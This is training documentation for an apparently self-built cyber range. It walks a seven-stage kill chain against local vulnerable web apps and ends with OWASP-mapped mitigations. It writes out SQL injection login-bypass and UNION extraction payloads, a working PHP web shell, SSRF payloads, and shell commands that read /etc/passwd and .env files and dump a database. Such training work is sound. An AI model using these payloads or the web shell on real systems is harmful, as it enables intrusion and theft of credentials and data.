# W Corp Cyber Range - Cyber Kill Chain Documentation

## Overview
This document outlines the complete cyber kill chain demonstration using the W Corp cyber range environment. The kill chain follows the traditional 7-stage model and demonstrates how attackers can exploit multiple vulnerabilities to achieve their objectives.

## Cyber Kill Chain Stages

### 1. Reconnaissance
**Objective:** Gather information about the target system

**Techniques Demonstrated:**
- **robots.txt Analysis:** `http://localhost:3000/robots.txt`
  - Reveals directory structure and sensitive paths
  - Exposes `/admin/`, `/api/`, `/uploads/`, `/php/`, `/config/`, `/backup/`
  
- **HTML Source Code Analysis:** `http://localhost:3000/`
  - Comments reveal internal information
  - Database credentials and system architecture exposed
  
- **Sitemap Analysis:** `http://localhost:3000/sitemap.xml`
  - Complete application structure mapped
  - API endpoints and sensitive files identified
  
- **Directory Enumeration:** `http://localhost:8080/`
  - PHP legacy system discovered
  - Vulnerable components identified

**Tools Used:**
- Web browser
- curl/wget for automated reconnaissance
- Directory enumeration tools

### 2. Weaponization
**Objective:** Create malicious payloads for exploitation

**Payloads Created:**
- **SQL Injection Payloads:**
  ```sql
  admin' OR '1'='1' --
  admin' UNION SELECT 1,2,3,4,5,6,7 --
  admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --
  ```

- **Web Shell Payload:**
  ```php
  <?php
  if (isset($_GET['cmd'])) {
      echo "<pre>";
      system($_GET['cmd']);
      echo "</pre>";
  }
  ?>
  ```

- **SSRF Payloads:**
  ```
  http://localhost:3000/.env
  http://localhost:3000/package.json
  file:///etc/passwd
  ```

### 3. Delivery
**Objective:** Deliver malicious payloads to the target

**Delivery Vectors:**
- **File Upload Vulnerability:** `http://localhost:8080/upload.php`
  - Upload web shell through vulnerable form
  - No file type validation or restrictions
  
- **SQL Injection:** `http://localhost:8080/login.php`
  - Inject malicious SQL through login form
  - Bypass authentication and extract data

### 4. Exploitation
**Objective:** Execute malicious code and gain initial access

**Exploitation Techniques:**
- **SQL Injection Exploitation:**
  - Bypass authentication: `admin' OR '1'='1' --`
  - Extract user credentials and sensitive data
  - Enumerate database schema
  
- **Web Shell Execution:**
  - Access uploaded shell: `http://localhost:8080/uploads/shell.php`
  - Execute system commands: `?cmd=whoami`
  - Gain remote command execution

### 5. Installation
**Objective:** Establish persistent access

**Persistence Techniques:**
- **Web Shell Persistence:**
  - Maintain access through uploaded web shell
  - Create additional backdoors if needed
  
- **Session Hijacking:**
  - Exploit predictable session tokens
  - Maintain access through stolen sessions

### 6. Command & Control (C2)
**Objective:** Establish communication channel for remote control

**C2 Channels:**
- **Web Shell C2:**
  - Use web shell for command execution
  - Maintain persistent access
  - Execute reconnaissance commands
  
- **SSRF C2:**
  - Use SSRF vulnerability for internal network access
  - Exfiltrate data through SSRF endpoints

### 7. Actions on Objectives
**Objective:** Achieve the attacker's ultimate goals

**Objectives Achieved:**
- **Data Exfiltration:**
  - Extract user credentials and personal information
  - Access sensitive data through IDOR vulnerabilities
  - Download database dumps
  
- **System Compromise:**
  - Gain administrative access
  - Modify system configurations
  - Install additional malware

## Complete Attack Scenario

### Step-by-Step Attack Flow

1. **Initial Reconnaissance**
   ```bash
   curl http://localhost:3000/robots.txt
   curl http://localhost:3000/sitemap.xml
   ```

2. **Vulnerability Discovery**
   - Identify SQL injection in PHP login form
   - Discover unrestricted file upload
   - Find IDOR vulnerabilities in API endpoints

3. **Authentication Bypass**
   ```sql
   Username: admin' OR '1'='1' --
   Password: anything
   ```

4. **Data Extraction**
   ```sql
   Username: admin' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users --
   Password: anything
   ```

5. **Web Shell Upload**
   - Create `shell.php` with web shell code
   - Upload through vulnerable form
   - Access at `http://localhost:8080/uploads/shell.php`

6. **System Compromise**
   ```bash
   # Through web shell
   ?cmd=whoami
   ?cmd=ls -la
   ?cmd=cat /etc/passwd
   ```

7. **Data Exfiltration**
   ```bash
   # Database dump
   ?cmd=mysqldump -u wcorp_user -pwcorp_pass wcorp_db
   
   # Access sensitive files
   ?cmd=cat /var/www/html/.env
   ```

8. **Lateral Movement**
   - Use IDOR to access other user profiles
   - Extract sensitive data from internal notes
   - Access admin functionality

## Vulnerabilities Exploited

### OWASP Top 10 Vulnerabilities

1. **A01 - Broken Access Control (IDOR)**
   - `/api/user/profile/:id` - No authorization checks
   - `/api/user/sensitive/:id` - Sensitive data exposure
   - `/api/user/notes/:id` - Internal notes exposure

2. **A02 - Cryptographic Failures**
   - Passwords stored in plain text
   - No password hashing or encryption

3. **A03 - Injection (SQL Injection)**
   - Raw SQL queries without prepared statements
   - User input directly concatenated into SQL

4. **A05 - Security Misconfiguration**
   - Exposed environment files
   - Exposed configuration files
   - Weak file permissions

5. **A07 - Identification and Authentication Failures**
   - Predictable session tokens
   - No rate limiting on login attempts
   - Weak authentication mechanisms

6. **A08 - Software and Data Integrity Failures**
   - Unrestricted file upload
   - No file type validation
   - No virus scanning

7. **A10 - Server-Side Request Forgery (SSRF)**
   - No URL validation in fetch endpoint
   - Internal network access possible

## Mitigation Strategies

### For Each Vulnerability

1. **A01 - Broken Access Control**
   - Implement proper authorization checks
   - Use role-based access control (RBAC)
   - Validate user permissions for each request

2. **A02 - Cryptographic Failures**
   - Use strong password hashing (bcrypt, Argon2)
   - Implement proper key management
   - Use HTTPS for all communications

3. **A03 - Injection**
   - Use prepared statements
   - Implement input validation
   - Use parameterized queries

4. **A05 - Security Misconfiguration**
   - Remove sensitive files from web root
   - Implement proper access controls
   - Use security headers

5. **A07 - Authentication Failures**
   - Implement rate limiting
   - Use secure session management
   - Implement multi-factor authentication

6. **A08 - Data Integrity Failures**
   - Implement file type validation
   - Use virus scanning
   - Implement file size limits

7. **A10 - SSRF**
   - Implement URL validation
   - Use allowlists for internal resources
   - Implement network segmentation

## Conclusion

This cyber range successfully demonstrates a complete cyber kill chain using multiple OWASP Top 10 vulnerabilities. The environment provides a realistic scenario for security training and vulnerability assessment. The attack flow shows how seemingly minor vulnerabilities can be chained together to achieve significant system compromise.

The key takeaway is that security is only as strong as the weakest link. A comprehensive security program must address all potential attack vectors and implement defense in depth strategies.
